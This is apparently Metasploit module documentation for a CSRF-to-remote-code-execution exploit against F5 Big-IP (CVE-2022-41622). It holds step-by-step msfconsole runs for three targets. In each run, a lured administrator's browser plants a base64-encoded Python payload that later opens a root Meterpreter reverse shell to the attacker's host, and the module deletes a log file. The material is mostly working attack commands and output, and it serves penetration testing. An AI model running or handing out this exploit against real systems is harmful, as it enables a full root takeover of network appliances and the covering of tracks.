## Vulnerable Application

The vulnerable application is F5 Big-IP version 17.0.0.1 and below. It can be
downloaded as a VMWare image for free (you have to create an account) from
https://downloads.f5.com. You can register for a free 30-day trial if you like,
but it's not required to test this.

Boot the VM and set an admin password by logging in with the default credentials
(admin / admin). You'll need that password.

## Verification Steps

This is a CSRF vuln, so it requires a browser in addition to msf:

1. Install the application
2. Start `msfconsole`
3. Do: `use exploit/linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622`
4. Do `set TARGET_HOST <target>` / `set LHOST <yourtest>`
5. Do: `run`
6. You should get a url such as: `http://10.0.0.179:8080/ddgjZO`
7. Open a browser and visit that URL
8. If you don't already have an HTTP Basic session, it'll ask for your credentials (the `admin` account from earlier works great)

## Options

### `TARGET_HOST` / `TARGET_URI` / `TARGET_SSL`

These are the target that the user will be redirected to

### `FILENAME`

If the `TARGET` is `2` (`Custom`), the file that will be overwritten with the payload

## Scenarios

### F5 Big-IP 17.0.0.1 - Target 0 (Restart)

Start the listener:

```
msf6 > use exploit/linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set TARGET_HOST 10.0.0.162
TARGET_HOST => 10.0.0.162

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set LHOST 10.0.0.179
LHOST => 10.0.0.179

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[+] Starting HTTP server; an administrator with an active HTTP Basic session will need to load the URL below
[*] Using URL: http://10.0.0.179:8080/LXsNzhG6zMdQ
[*] Server started.
```

Then, a legit user that has HTTP Basic authentication (or who can be tricked
into performing HTTP Basic authentication) needs to visit that URL. When any
user connects, they'll be redirected to the SOAP endpoint and you'll see:

```
msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > exploit

[*] Started reverse TCP handler on 10.0.0.179:4444 
[+] Starting HTTP server; an administrator with an active HTTP Basic session will need to load the URL below
[*] Using URL: http://10.0.0.179:8080/LXsNzhG6zMdQ
[*] Server started.

[... wait for a user to visit the URL ...]

[*] Redirecting the admin to overwrite /shared/f5_update_action; if successful, your session will come approximately 2 minutes after the target is rebooted
```

We have no way to tell whether this was successful; however, if we already have
access to the target (ie, if you're testing this), we can check if the file was
successfully planted:

```
[root@bigip:Active:Standalone] config # cat /shared/f5_update_action 
UpdateAction
https://localhost/success`echo exec\(__import__\(\'base64\'\).b64decode[...]
https://localhost/error
0
0
0
0
```

The code planted there will activate at reboot. So, ...wait till the target
reboots. Perhaps when they update! Again, if you have shell access, you can
check the log file when it boots:

```
[root@bigip:INOPERATIVE:] config # tail -f /var/log/f5_update_checker.out
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file found -- parsing
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file action: "UpdateAction"
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file success URL: "https://localhost/success`echo exec\(__import__\(\'base64\'\).b64decode[...]
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file failure URL: "https://localhost/error"
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file rebootOnSuccess flag: "8"
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file rebootOnSuccess slot: "0"
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file rebootOnFailure flag: "0"
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: EM callback file rebootOnFailure slot: "0"
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: Executing EM action: UpdateAction
[Mon Nov 14 15:26:02 2022] f5em_callback [INFO]: Sleeping for 2 minutes before first attempt.
[...wait 2 minutes...]
[Mon Nov 14 15:28:02 2022] f5em_callback [INFO]: Finished sleeping.
[Mon Nov 14 15:28:02 2022] f5em_callback [INFO]: Attempting to connect to EM server: "https://localhost/success`echo exec\(__import__\(\'base64\'\).b64decode[...]
```

And, on Metasploit:

```
[*] Redirecting the admin to overwrite /shared/f5_update_action; if successful, your session will come approximately 2 minutes after the target is rebooted
[...wait 2 minutes...]
[*] Sending stage (40164 bytes) to 10.0.0.162
[+] Deleted /var/log/f5_update_checker.out
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.162:51388) at 2022-11-14 15:28:04 -0800

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: root
```

### F5 Big-IP 17.0.0.1 - Target 1 (Login)

This works similarly.. use the module, set the `TARGET_HOST`, and set the
`TARGET` to `1`:

```
msf6 > use exploit/linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set TARGET_HOST 10.0.0.162
TARGET_HOST => 10.0.0.162

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set LHOST 10.0.0.179
LHOST => 10.0.0.179

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set TARGET 1
TARGET => 1

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[+] Starting HTTP server; an administrator with an active HTTP Basic session will need to load the URL below
[*] Using URL: http://10.0.0.179:8080/ePg5ECHuVD
[*] Server started.

[...wait for an authenticated user to click the link...]

[*] Redirecting the admin to overwrite /var/run/config/timeout.sh; if successful, your session will come the next time a user logs in interactively
```

Once again, if you already have access, you can verify it worked:

```
[root@bigip:Active:Standalone] config # cat /etc/profile.d/timeout.sh 
echo exec\(__import__\(\'base64\'\).b64decode[...]
```

Then, when a user logs in (ie, `ssh root@<target>` or on the console), you get
a session:

```
[*] Redirecting the admin to overwrite /var/run/config/timeout.sh; if successful, your session will come the next time a user logs in interactively

[...wait for a user to log in..]

[*] Sending stage (40168 bytes) to 10.0.0.162
[+] Deleted /var/run/config/timeout.sh
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.162:43902) at 2022-11-14 15:32:26 -0800

meterpreter > getuid
Server username: root
```

### F5 Big-IP 17.0.0.1 - Target 2 (Custom)

Once again, set up the server:

```
msf6 > use exploit/linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set TARGET_HOST 10.0.0.162
TARGET_HOST => 10.0.0.162

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set LHOST 10.0.0.179
LHOST => 10.0.0.179

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set TARGET 2
TARGET => 2

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > set FILENAME /tmp/testmsfmodule
FILENAME => /tmp/testmsfmodule

msf6 exploit(linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[+] Starting HTTP server; an administrator with an active HTTP Basic session will need to load the URL below
[*] Using URL: http://10.0.0.179:8080/PLvOVjkiVvXX
[*] Server started.

[...wait for an admin to visit that link...]

[*] Redirecting the admin to overwrite /tmp/testmsfmodule with the payload
```

You can verify the file exists:

```
# cat /tmp/testmsfmodule 
echo exec\(__import__\(\'base64\'\).b64decode[...]
```

Note that while this is written by root, you're in a pretty strict SELinux
context so most obvious attacks (like writing to /etc/profile.d, /root/.ssh,
etc., won't work).
